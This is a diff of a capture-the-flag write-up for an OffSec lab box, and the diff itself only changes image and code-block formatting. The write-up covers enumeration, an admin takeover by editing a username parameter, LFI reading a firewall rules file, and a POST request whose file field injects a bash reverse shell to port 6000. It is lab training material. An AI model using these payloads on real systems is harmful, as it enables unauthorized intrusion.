@@ -18,7 +18,7 @@ PORT   STATE SERVICE
 
 Port 80 hosts the default Apache2 page:
 
-<figure><img src="../../../.gitbook/assets/image (2181).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2181).png>)
 
 I ran a `gobuster` scan and found a few directories:
 
@@ -44,7 +44,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The `/svn` directory requires credentials:
 
-<figure><img src="../../../.gitbook/assets/image (3026).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3026).png>)
 
 Using `admin:admin` doesn't work for this. When we view the traffic in Burpsuite, we can see that the `Authorization` header is added and it uses the Basic Base64 method of authenticating users.
 
@@ -67,7 +67,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 This directory just contains some interesting files:
 
-<figure><img src="../../../.gitbook/assets/image (2799).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2799).png>)
 
 ### Source Code Review -> RCE Point
 
@@ -103,7 +103,7 @@ This bit of code does not validate the name of the file that is being deleted. I
 
 However, when trying to exploit this thing, the `internal` website does not seem to be working with all the links being broken.
 
-<figure><img src="../../../.gitbook/assets/image (1421).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1421).png>)
 
 This made me think more about WHERE exactly this site is being hosted.
 
@@ -154,37 +154,36 @@ There's a hidden domain here! We can add that to our `/etc/hosts` file and enume
 
 The website led us to this login page:
 
-<figure><img src="../../../.gitbook/assets/image (3206).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3206).png>)
 
 Remember that we have the source code of this website, so we can find all the endpoints at the `views.py` file we saw earlier. The `/register` directory lets us register a new user.
 
-<figure><img src="../../../.gitbook/assets/image (1809).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1809).png>)
 
 We can then login to the site! For some reason it's not loading the visual elements right on my machine...
 
-<figure><img src="../../../.gitbook/assets/image (2214).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2214).png>)
 
 There are a few functions in this site. We know that the 'Submission' one is vulnerable, but we need some kind of administrator account first. So we can view the 'MyAccount' function:
 
-<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(188).png>)
 
 When the traffic is intercepted, it includes a `username` parameter:
 
-<figure><img src="../../../.gitbook/assets/image (2540).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2540).png>)
 
 Maybe we can change the username to something else, so I changed it to `admin` and found that I could login as the `admin` user!
 
-<figure><img src="../../../.gitbook/assets/image (3091).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3091).png>)
 
 ### LFI Firewall Rules -> Shell
 
 The administrator had a few things different, such as the 'Submissions' function being replaced with a submission reviewer:
 
-<figure><img src="../../../.gitbook/assets/image (3256).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3256).png>)
 
 When we choose a report and view it, it sends this HTTP POST request:
 
-{% code overflow="wrap" %}
 ```http
 POST /submissions/ HTTP/1.1
 Host: internal-phobos.phobos.offsec
@@ -204,17 +203,16 @@ Upgrade-Insecure-Requests: 1
 
 csrfmiddlewaretoken=hZhbo5cgeCuFoeIhJqK2b9S7Xn2rD2CHrWVJrz3hMYJZ0gPT46o7nzUd5M7XJNi1&file=report1&action=view
 ```
-{% endcode %}
 
 This looks vulnerable to LFI, and testing it reveals that it works!
 
-<figure><img src="../../../.gitbook/assets/image (2793).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2793).png>)
 
 Earlier, the repository comments mentioned something about a UFW firewall. A quick google search on its files reveal that the rules are stored at `/etc/ufw/user.rules`, which can be read using the LFI:
 
 
 
-<figure><img src="../../../.gitbook/assets/image (3976).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3976).png>)
 
 Here are the rules:
 
@@ -238,7 +236,6 @@ This machine seems to only accept connections using port 6000, which is probably
 
 Here's the request I sent:
 
-{% code overflow="wrap" %}
 ```http
 POST /submissions/ HTTP/1.1
 Host: internal-phobos.phobos.offsec
@@ -258,11 +255,10 @@ Upgrade-Insecure-Requests: 1
 
 csrfmiddlewaretoken=lUZv7MQQ8VaNbnkvd8DgAbLB0WIT1V3CvRD3agHRGhp7Npr7yOhlMBNH8lNp7GJW&file=test%3bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.164%2F6000%200%3E%261&action=delete
 ```
-{% endcode %}
 
 This wold give us a shell as `www-data`:
 
-<figure><img src="../../../.gitbook/assets/image (3408).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3408).png>)
 
 The user flag is within the `/var/www` directory.
 
@@ -317,12 +313,12 @@ ssh_login
 
 There are some hashes present, and all 3 are crackable:
 
-<figure><img src="../../../.gitbook/assets/image (1646).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1646).png>)
 
 The last password was for the user `root`, and we can try an `su`, which ends up working:
 
 
 
-<figure><img src="../../../.gitbook/assets/image (3603).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3603).png>)
 
 Rooted!
